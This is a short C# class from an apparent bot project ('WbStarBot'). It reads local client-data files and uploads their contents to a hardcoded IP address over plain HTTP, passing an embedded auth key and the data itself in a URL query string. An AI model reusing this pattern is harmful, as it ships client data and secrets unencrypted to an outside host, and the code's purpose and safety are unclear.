using System;
using System.Web;
using System.Net;
using System.Collections.Specialized;
using System.IO;

namespace WbStarBot.Cloud
{
    public class CloudHandler
    {
        private const string uploadUrl = "http://92.255.77.27:7777/starbot.ru/s.php";
        private const string fileReciverUrl = "";
        private const string authKey = "rC234ri2ohf8401hfnwlRoE13uUB";

        public void UploadData()
        {
            UploadData(File.ReadAllText(OutputHandler.clientsDataFile), File.ReadAllText(OutputHandler.clientsFile));
        }

        public void UploadFiles(params string[] files)
        {
            using (var client = new System.Net.WebClient())
            {
                foreach (string file in files) {
                    client.UploadFile(uploadUrl, file);
                }
            }
        }

        public async void UploadData(string clientDatas, string clients)
        {
            string link = $"{uploadUrl}?Auth={authKey}&ClientDatas={clientDatas}&Clients={clients}";
            using(HttpClient client = new HttpClient())
            {
                await client.GetAsync(link);
            }
        }
    }
}

